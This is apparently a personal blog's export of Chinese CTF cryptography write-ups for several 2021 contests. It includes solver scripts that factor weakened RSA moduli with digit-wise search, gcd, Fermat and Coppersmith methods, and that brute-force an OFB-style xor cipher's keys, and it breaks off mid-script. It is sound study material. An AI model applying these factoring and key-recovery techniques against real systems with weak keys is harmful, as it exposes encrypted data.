<p>但还是太菜了，密码全程做下来很麻，series和ticket_login零解，easyRSA十一解；比赛中看的两道都感觉做过，series和<a href="https://blog.csdn.net/m0_49109277/article/details/117441546?spm=1001.2014.3001.5501">斐波那契数列</a>那题很像，已知少了点；easyRSA就完全是原题了，就是<a href="https://blog.csdn.net/m0_49109277/article/details/120402275?spm=1001.2014.3001.5501">海洋大学校赛</a>的那道题差不多类似，只是二进制改成十进制了，这次吃了只抄脚本的亏了。好在尚师傅比赛结束就用第五空间的脚本改出来了，能让我对这种类型的题目加以理解</p>
<span id="more"></span>

<h2 id="长安杯"><a href="#长安杯" class="headerlink" title="长安杯"></a>长安杯</h2><h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><p>第三次遇到了，但网上对这种类型题目的介绍少之甚少，也可能是我没搜到；但对于大师傅而言这都是很基础很基础的了，懒得写脚本的那种</p>
<p>（这不就有了吗，<a href="https://math.stackexchange.com/questions/2087588/integer-factorization-with-additional-knowledge-of-p-oplus-q">来自官方WP</a>，四年前的）</p>
<hr>
<p>对于读懂代码环节，下面两句话是关键，也是尚师傅看出来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ans = ans*<span class="number">10</span>+(a0[i+<span class="built_in">len</span>(a0)-<span class="built_in">len</span>(b0)]+b0[i]+<span class="number">4</span>)%<span class="number">10</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ans = ans*<span class="number">10</span>+((a0[i+<span class="built_in">len</span>(a0)-<span class="built_in">len</span>(b0)]+<span class="number">2</span>)*(b0[i]+<span class="number">2</span>))%<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>里面的数字不是随便添加的，而是由于前面转了字节，所以这里a0和b0是ascii码；上面实现的是没有进位也就是类似有限域是10的十进制加法和乘法</p>
<p>知道加和乘之后的结果，让我们求p和q</p>
<p>虽然每一步都知道怎么推，但是堆叠多了，脑子转不过来；针对这道题有一种写法，感觉非常的巧妙</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pq0 = [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    pq, pq0 = pq0, [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>每次给pq0清空去装符合条件的新值，并用pq去存上一次的值，通过遍历pq选择符合条件的装入pq0</p>
<p>确实讲不得清楚，自己也还没完全搞懂，先贴个脚本，再遇到用这个结构试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">100457237809578238448997689590363740025639066957321554834356116114019566855447194466985968666777662995007348443263561295712530012665535942780881309520544097928921920784417859632308854225762469971326925931642031846400402355926637518199130760304347996335637140724757568332604740023000379088112644537238901495181</span></span><br><span class="line">c = <span class="number">49042009464540753864186870038605696433949255281829439530955555557471951265762643642510403828448619593655860548966001304965902133517879714352191832895783859451396658166132732818620715968231113019681486494621363269268257297512939412717227009564539512793374347236183475339558666141579267673676878540943373877937</span></span><br><span class="line">ad = <span class="string">b&#x27;0399034381787849923326924881454040531711492204619924608227265350044149907274051734345037676383421545973249148286183660679683016947030357640361405556516408&#x27;</span></span><br><span class="line">mu = <span class="string">b&#x27;6004903250672248020273453078045186428048881010508070095760634049430058892705564009054400328070528434060550830050010084328522605000400260581038846465000861&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">xx, yy</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> xi <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> yi <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> (xi + yi) % <span class="number">10</span> == xx <span class="keyword">and</span> (xi * yi) % <span class="number">10</span> == yy:</span><br><span class="line">                res.append((xi, yi))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">t, p0, q0</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p0 * q0 % <span class="number">10</span> ** (t + <span class="number">1</span>) == n % (<span class="number">10</span> ** (t + <span class="number">1</span>)):</span><br><span class="line">        pq0.append((p0, q0))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pq0 = [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mu)):</span><br><span class="line">    pq, pq0 = pq0, [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line">    x = ad[-k - <span class="number">1</span>] - <span class="number">48</span></span><br><span class="line">    y = mu[-k - <span class="number">1</span>] - <span class="number">48</span></span><br><span class="line">    <span class="keyword">for</span> ans <span class="keyword">in</span> solve(x, y):</span><br><span class="line">        <span class="keyword">for</span> (i, j) <span class="keyword">in</span> pq:</span><br><span class="line">            i = (i + ans[<span class="number">0</span>] * <span class="number">10</span> ** k)</span><br><span class="line">            j = (j + ans[<span class="number">1</span>] * <span class="number">10</span> ** k)</span><br><span class="line">            add(k, i, j)</span><br><span class="line">p = pq0[-<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>RSA p^q</tag>
      </tags>
  </entry>
  <entry>
    <title>20210929 绿城杯Crypto方向WP</title>
    <url>/posts/85864d0a/</url>
    <content><![CDATA[<p>听名字就不咋滴</p>
<p>怎么像个房地产的名字</p>
<span id="more"></span>

<h1 id="绿城杯"><a href="#绿城杯" class="headerlink" title="绿城杯"></a>绿城杯</h1><h2 id="Crypto-warmup加密算法"><a href="#Crypto-warmup加密算法" class="headerlink" title="Crypto-warmup加密算法"></a>Crypto-warmup加密算法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">cipher_text, a, b, m</span>):</span></span><br><span class="line">    d = gmpy2.invert(a, m)</span><br><span class="line">    plain_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher_text:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            addr = str1.find(i)</span><br><span class="line">            plain_text += str1[d * (addr - b) % m]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plain_text += i</span><br><span class="line">    <span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;aoxL&#123;XaaHKP_tHgwpc_hN_ToXnnht&#125;&#x27;</span></span><br><span class="line">decode(cipher, <span class="number">37</span>, <span class="number">23</span>, <span class="number">52</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-RSA-1"><a href="#Crypto-RSA-1" class="headerlink" title="Crypto-RSA-1"></a>Crypto-RSA-1</h2><p>尚师傅拿了二血</p>
<p>这个性质是真的好用（仅限CTF？），如果$n=pq$，且$(p,\ q)=1$<br>$$<br>c\equiv m^e\ mod\ n\Leftrightarrow c\equiv m^e\ mod\ p,\ c\equiv m^e\ mod\ q<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line">c = <span class="number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = gcd(n, c)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line">padding = <span class="number">2021</span> * <span class="number">1001</span> * p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n) // padding))</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-RSA2-PLUS"><a href="#Crypto-RSA2-PLUS" class="headerlink" title="Crypto-RSA2-PLUS"></a>Crypto-RSA2-PLUS</h2><p>好吧，一天看了三道简单题，赛方没有密码师傅啊</p>
<p>第二层解个方程就好，第一层主要用到费马分解，分解出来可能是$pq$和$p_1q_1$，或$pq_1$或者$p_1q$，然后设下未知数爆破解方程就好</p>
<p>可以试试，512位的相邻素数之间一般一个差3位数</p>
<p>脚本可以写得更好点，但是对于这题没必要，<em>她值得更好</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, iroot</span><br><span class="line"><span class="keyword">from</span> public <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># level1</span></span><br><span class="line"><span class="comment"># yafu</span></span><br><span class="line">pq1 = <span class="number">79679231796035037354449627487236220201878797729093909877127396750043503300636464774059752126148617367251988043645511172901030621825575172979048675217345099706517900079260617448298874437193769061144201311929792287772928471712053565834702260975126852624433945451405258351557569670978748727663718174543709899747</span></span><br><span class="line"></span><br><span class="line">p1q = n1 // pq1</span><br><span class="line">z = <span class="built_in">abs</span>(pq1 - p1q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force_pq</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000</span>, <span class="number">2</span>):</span><br><span class="line">            delta = (x * y + z) ** <span class="number">2</span> + <span class="number">4</span> * x * y * p1q</span><br><span class="line">            <span class="keyword">if</span> delta &gt; <span class="number">0</span> <span class="keyword">and</span> iroot(delta, <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">                p = ((-z - x * y) + iroot(delta, <span class="number">2</span>)[<span class="number">0</span>]) // (<span class="number">2</span> * x)</span><br><span class="line">                <span class="keyword">if</span> isPrime(p):</span><br><span class="line">                    q1 = p1q // p</span><br><span class="line">                    p1, q = nextprime(p), prevprime(q1)</span><br><span class="line">                    phi = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>) * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> phi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># level2</span></span><br><span class="line">a = symbols(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = symbols(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">ans = solve([a * b - p2q2,  a + b - p2_q2], [a, b])[<span class="number">0</span>]</span><br><span class="line">p2, q2 = ans</span><br><span class="line"><span class="keyword">if</span> n2 != p2 ** <span class="number">2</span> * q2 ** <span class="number">3</span>:</span><br><span class="line">    p2, q2 = q2, p2</span><br><span class="line"><span class="keyword">assert</span> n2 == p2 ** <span class="number">2</span> * q2 ** <span class="number">3</span></span><br><span class="line">phi1 = brute_force_pq()</span><br><span class="line">phi2 = <span class="built_in">int</span>((p2 - <span class="number">1</span>) * p2 * (q2 - <span class="number">1</span>) * q2 ** <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c1, invert(e, phi1), n1)).decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c2, invert(e, phi2), n2)).decode())</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20211008 鹤城杯Crypto方向WP</title>
    <url>/posts/4ed7c718/</url>
    <content><![CDATA[<p>这是我写过最短的WP了吧</p>
<p>这至少flag改下吧，一点都不走心</p>
<span id="more"></span>

<h1 id="鹤城杯"><a href="#鹤城杯" class="headerlink" title="鹤城杯"></a>鹤城杯</h1><h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h2><p>社会主义好，社会主义好</p>
<h2 id="a-crypto"><a href="#a-crypto" class="headerlink" title="a_crypto"></a>a_crypto</h2><p>lj<a href="http://www.3fwork.com/kaifa200/004475MYM012472/">原题</a></p>
<p>下班</p>
<hr>
<p>上班</p>
<h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p><a href="http://www.zbc53.top/archives/148/">Striving师傅博客</a>里有，不愧是他</p>
<p>用q的低位得到p的低位，和Yusa美国大选那题类似，然后用CopperSmith解方程，这样范围应该可以</p>
<p>稍微写一下吧</p>
<hr>
<p>首先我们简单试验下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">p1 = p % (<span class="number">2</span> ** <span class="number">50</span>)</span><br><span class="line">q1 = q % (<span class="number">2</span> ** <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(p1 * q1)[<span class="number">2</span>:][-<span class="number">50</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(n)[<span class="number">2</span>:][-<span class="number">50</span>:])</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">11111010001010111111110101111111001001100100000111</span><br><span class="line">11111010001010111111110101111111001001100100000111</span><br></pre></td></tr></table></figure>

<p>得到的结果显示知道n和q的低位，求出p的低位显然不在话下，这个就很想<a href="https://4xwi11.github.io/posts/ea88a88e/#classical%EF%BC%88recuring%EF%BC%89">中国海洋大学的那道题</a>的简化版</p>
<hr>
<p>有师傅说（没有师傅说）这不就是已知p的高位吗，直接用CopperSmith行不行</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009143059578.png" alt="image-20211009143059578"></p>
<p>la佬的博客上也说了，起码知道约$\frac{1}{2}$位数才行，而且就算是像<a href="https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrsa">corCTF babyrsa</a>可以爆破，但题目是1024左移724位，最多爆破几位也远远不够</p>
<p>所以必须先用q的低位，得到p的低265位，这样相当于知道p的565位了，这样才有一半</p>
<p>其次根据n和p的高300位和低265位求p中间的459位，可以列一式子<br>$$<br>p_0&lt;&lt;724+p1&lt;&lt;265+p_2=n<br>$$<br>位运算不好看就<br>$$<br>p_0\times 2^{724}+p_1\times 2^{265}+p_2=n<br>$$<br>$p_1$不知道，设为$x$<br>$$<br>p_0\times 2^{724}+x\times 2^{265}+p_2=n<br>$$<br>这不就是CopperSmith解一元吗，想了解更多的师傅可以看<a href="https://4xwi11.github.io/posts/493b5ffc/#Crypto-babyrand%EF%BC%88recuring%EF%BC%89">corCTF babyrand</a></p>
<p>emmmmmm本来以为差不多，但是没有出来，解出来是空的，也就是范围太大，CopperSmith还是解不了</p>
<p>看了Striving师傅的博客</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009152100154.png" alt="image-20211009152100154"></p>
<p>原来还有这种讲究，我还以为已经一半多了</p>
<p>哦，我记起来了，在corCTF也不是没遇到过，所以多爆几位吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009152240651.png" alt="image-20211009152240651"></p>
<p>完整的exp，这个自己想不容易被带偏，当然Striving师傅的博客里有直接推导出p低位的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">p0 = <span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line">q2 = <span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line">n = <span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line">c = <span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># q2 -&gt; p2</span></span><br><span class="line">known_low_bits = <span class="number">265</span></span><br><span class="line">n2 = <span class="built_in">bin</span>(n)[<span class="number">2</span>:][-known_low_bits:]</span><br><span class="line">p2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(known_low_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span> + p2, <span class="number">2</span>) * q2)[<span class="number">2</span>:].endswith(n2[-(i+<span class="number">1</span>):]):</span><br><span class="line">        p2 = <span class="string">&#x27;1&#x27;</span> + p2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p2 = <span class="string">&#x27;0&#x27;</span> + p2</span><br><span class="line">p2 = <span class="built_in">int</span>(p2, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># print(bin(p2 * q2)[2:][-known_low_bit:])</span></span><br><span class="line"><span class="comment"># print(n2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p2, p0 -&gt; p</span></span><br><span class="line">p0 = p0 &lt;&lt; <span class="number">724</span></span><br><span class="line">unknown_bits = <span class="number">459</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    fx = p0 + x * <span class="number">2</span> ^ (<span class="number">265</span> + bit) + p2</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**bit)):</span><br><span class="line">        f = fx + i * <span class="number">2</span> ^ <span class="number">265</span></span><br><span class="line">        f = f.monic()</span><br><span class="line">        kbits = unknown_bits - bit</span><br><span class="line">        p1 = f.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">        <span class="keyword">if</span> p1:</span><br><span class="line">            p = p0 + <span class="built_in">int</span>(p1[<span class="number">0</span>]) * <span class="number">2</span> ^ (<span class="number">265</span> + bit) + p2 + i * <span class="number">2</span> ^ <span class="number">265</span></span><br><span class="line">            <span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">            q = n // p</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, n-p-q+<span class="number">1</span>), n)))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211009175518651.png" alt="image-20211009175518651"></p>
<h2 id="Crazy-Rsa-Tech"><a href="#Crazy-Rsa-Tech" class="headerlink" title="Crazy_Rsa_Tech"></a>Crazy_Rsa_Tech</h2><p>广播，sage里crt一把梭就出来了</p>
<p>下班</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>CopperSmith</tag>
      </tags>
  </entry>
  <entry>
    <title>20211016 BytesCTFCrypto方向部分WP</title>
    <url>/posts/7187731/</url>
    <content><![CDATA[<p>总共四道题，其中三道好懂，另外一道形式比较新颖，给了一个markdown文件（类似论文）以及一个ip，考协议</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211018112637736.png" alt="image-20211018112637736"></p>
<span id="more"></span>

<h1 id="BytesCTF"><a href="#BytesCTF" class="headerlink" title="BytesCTF"></a>BytesCTF</h1><h2 id="easyxor"><a href="#easyxor" class="headerlink" title="easyxor"></a>easyxor</h2><p><em>好题</em></p>
<p><em>在尚师傅的带领下我也有幸一瞥flag</em></p>
<p><em>之前是以为技术不行，脑力不行，现在配置也不太行了</em></p>
<p><em>呜呜呜，我日</em></p>
<p>一开始是最朴素地逆算法</p>
<p>第一点，convert这个函数是可以循环回来的，根据<a href="https://4xwi11.github.io/posts/ca3b3eaf/">之前的经验</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">m, k, c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> m ^ m &gt;&gt; (-k) &amp; c</span><br><span class="line">    <span class="keyword">return</span> m ^ m &lt;&lt; k &amp; c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m, key</span>):</span></span><br><span class="line">    c_list = [<span class="number">0x37386180af9ae39e</span>, <span class="number">0xaf754e29895ee11a</span>, <span class="number">0x85e1a429a2b7030c</span>, <span class="number">0x964c5a89f6d3ae8c</span>]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        m = shift(m, key[t], c_list[t])</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p>而且如果对于每一对key，convert循环回来的时间是一样的，要么是一半，保险乘个2就好</p>
<p>关于OFB看这张图也很清楚</p>
<p>一篇CSDN博客的图（本来想贴原图的，但是CSDN有防盗图功能，还不错）</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211019181106597.png" alt="image-20211019181106597"></p>
<p>从OFB模式以及flag最开始的一组<code>b&#39;ByteCTF&#123;&#39;</code>，刚好8位，可以爆破出keys：<code>[-12, 26, -3, -31]</code></p>
<p>下面是爆破keys的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span>(<span class="params">m, k, c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> m ^ m &gt;&gt; (-k) &amp; c</span><br><span class="line">    <span class="keyword">return</span> m ^ m &lt;&lt; k &amp; c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m, key</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    roll back</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    c_list = [<span class="number">0x37386180af9ae39e</span>, <span class="number">0xaf754e29895ee11a</span>, <span class="number">0x85e1a429a2b7030c</span>, <span class="number">0x964c5a89f6d3ae8c</span>]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        m = shift(m, key[t], c_list[t])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912&#x27;</span></span><br><span class="line">length = <span class="built_in">len</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment"># front</span></span><br><span class="line"><span class="comment"># get key</span></span><br><span class="line">cipher1 = cipher[:length // <span class="number">2</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(cipher1) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">c1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher1) // <span class="number">16</span>):</span><br><span class="line">    c1.append(<span class="built_in">int</span>(cipher1[i * <span class="number">16</span>: (i + <span class="number">1</span>) * <span class="number">16</span>], <span class="number">16</span>))</span><br><span class="line">plaintext1_block1 = bytes_to_long(<span class="string">b&#x27;ByteCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher1_block1 = c1[<span class="number">0</span>]</span><br><span class="line">cipher1_block2 = c1[<span class="number">1</span>]</span><br><span class="line">cipher1_block3 = c1[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">iv_keys_block1 = plaintext1_block1 ^ cipher1_block1</span><br><span class="line">space = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">32</span>, <span class="number">33</span>)]</span><br><span class="line">key = []</span><br><span class="line">plaintext1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> keys <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">    iv_keys_block2 = convert(iv_keys_block1, keys)</span><br><span class="line">    iv_keys_block3 = convert(iv_keys_block2, keys)</span><br><span class="line"></span><br><span class="line">    fake_plaintext_block2 = long_to_bytes(cipher1_block2 ^ iv_keys_block2)</span><br><span class="line">    fake_plaintext_block3 = long_to_bytes(cipher1_block3 ^ iv_keys_block3)</span><br><span class="line">    plaintext1 = <span class="string">b&#x27;ByteCTF&#123;&#x27;</span> + fake_plaintext_block2 + fake_plaintext_block3</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> plaintext1.decode().isascii() <span class="keyword">and</span> plaintext1.decode().isprintable():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;you complete first task: get keys &amp;&amp; half flag\nnow please wait for a minute, &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;it takes a long time&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;this is your flag, keep going&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(plaintext1)</span><br><span class="line">            key = keys</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 